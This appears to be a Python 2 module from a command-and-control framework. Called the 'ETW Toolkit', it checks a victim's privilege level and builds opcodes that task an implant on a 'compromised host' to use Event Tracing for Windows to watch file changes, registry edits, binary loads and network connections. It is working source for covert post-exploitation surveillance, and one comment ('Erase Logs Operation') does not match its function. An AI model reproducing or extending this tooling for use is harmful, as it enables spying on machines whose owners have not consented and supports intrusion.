from support import database

#Standard class name for each module when invoking
class IllusiveFogModule:
    def __init__(self,params=[]):
        self.params= params

        self.info={
            'Name'       : 'ETW Toolkit',
            'Description': 'Module Aims to perform operations using ETW (Event Tracing for Windows).',
            'Author'     : 'Internal Dev Team',
            'Escalated'  :  True
        }

        self.options={
            'Operation': self.params[1],
            'Victim': self.params[0]
        }

        self.modulehelp = """
        ETW ToolKIT
        ===========
        Description : Module Aims to perform operations using ETW (Event Tracing for Windows).
        URLS        : https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal
        
            Options :
                
                > Generic <: 
                    |    
                    ->    1; FetchClsidList - Fetch All CLSIDs under ETW.
                    |        Usage  : FetchClsidList
                    |        Example: FetchClsidList
                    |
                    ->    2; Subscribe      - Subscribe to a session for a certain time.
                    |        Usage :  Subscibe  <CLSID>  <SESSION NAME>  <TIME>
                    |        Example: Subscribe {838f9f38-f241-11de-a663-002421597a5c} EventLog-Application 10
                
                
                > Kernel-Mode Logger <:
                    |
                    ->     1; FileMon   - Fetch what files are being modified.
                    |           Usage   : FileMon <TIME>
                    |           Example : FileEvents 10
                    |
                    ->     2; RegKeyMon - Fetch what Registry Keys are being modified 
                    |           Usage   : RegkeyMon <TIME>
                    |           Example : RegKeyMon 10
                    |
                    ->     3; ImgldMon  - Monitor what binaries(exe/dll) ran over the compromised host. 
                    |           Usage   : ImgldMon <TIME>
                    |           Example : ImgldMon 10
                    |
                    ->     4; NtrkMon   - Monitor TCP-IP related activites (Providing what compromisied host is connecting to what IP).
                    |           Usage   : NtrkMon <TIME>
                    |           Example : NtrkMon 10

        """
        #Alias for Listing CLSID.
        self.ListClsidOp = "0x77"
        
        #Alias for Subscribing.
        self.SubscibeOp = "0x74"

        #Alias for FileMon
        self.FileMonOp = "0x75"

        #Alias for RegKeyMon
        self.RegKeyMonOP = "0x76"

        #Alias for ImgldMon
        self.ImgldMonOp = "0x78"

        #Alias for NtrkMon
        self.NtrkMonOp = "0x79" 

#Main function which will be called, Must return
    def run(self):

        #saving options
        self.operation=self.options['Operation']
        self.victim = self.options['Victim']
        
        #print info about module
        print ""
        print "Module Info:"
        print "-----------"
        print "Name :"+self.info['Name'] 
        print "Description :"+self.info['Description']
        print "Author :"+self.info['Author']
        print "[info] For more info about module usage, use option 'help'. example: ETW help"
        print "\n"
        
        if self.info['Escalated'] == True:
            #Check Privileges
            if database.Victim().FetchVictimPrivLvl(self.victim) != "1":
                print "[-] Operation cannot be initiated since Victim is not privileged enough."
                return False
            else:
                self.initOperation=self.operation.split()
                #Show/Print help of Module
                if self.initOperation[0] == "help":
                    print self.modulehelp
                    return False

                #Fetch CLSIDs
                elif self.initOperation[0] == "FetchClsidList":
                        return self.FetchCLSIDs()
                
                #ETW Subscribe
                elif self.initOperation[0] == "Subscribe":
                    return self.ETWSubscribe()
                
                #ETW File Modification Monitoring
                elif self.initOperation[0] == "FileMon":
                    return self.EtwFileMon()
                
                #ETW Registry key Changes monitoring
                elif self.initOperation[0] == "RegKeyMon":
                    return self.EtwRegKeyMon()

                #ETW Image Loading Monitoring
                elif self.initOperation[0] == "ImgldMon":
                    return self.EtwImgldMon()

                #ETW Network Monitoring    
                elif self.initOperation[0] == "NtrkMon":
                    return self.EtwNtrkMon()
                else:
                    print "[ERROR] Incorrect Option"
                    return False
    
    #Erase Logs Operation
    def FetchCLSIDs(self):
        return self.ListClsidOp
    
    #ETW Subscribe 
    def ETWSubscribe(self):
        if len(self.initOperation) < 4:
            print "[ERROR] Not Enough Arguments passed to initiate subscription."
            return False
        
        else:
            #       Alias                  CLSID                    SESSION Name                Time
            return self.SubscibeOp+":"+self.initOperation[1]+":"+self.initOperation[2]+":"+self.initOperation[3]
    
    #ETW File Montoring Func
    def EtwFileMon(self):
        if len(self.initOperation) < 2:
            print "[ERROR] Parameter Missing"
            return False
        else:
            return self.FileMonOp+":"+"1"+":"+self.initOperation[1]

    #ETW Registry Activities Monitoring Func
    def EtwRegKeyMon(self):
        if len(self.initOperation) < 2:
            print "[ERROR] Parameter Missing"
            return False
        else:
            return self.RegKeyMonOP+":"+"2"+":"+self.initOperation[1]
    
    #ETW Image Loading Monitoring Func
    def EtwImgldMon(self):
        if len(self.initOperation) < 2:
            print "[ERROR] Parameter Missing"
            return False
        else:
            return self.ImgldMonOp+":"+"3"+":"+self.initOperation[1]
    
    #ETW Network Activities Monitoring
    def EtwNtrkMon(self):
        if len(self.initOperation) < 2:
            print "[ERROR] Parameter Missing"
            return False
        else:
            return self.NtrkMonOp+":"+"4"+":"+self.initOperation[1]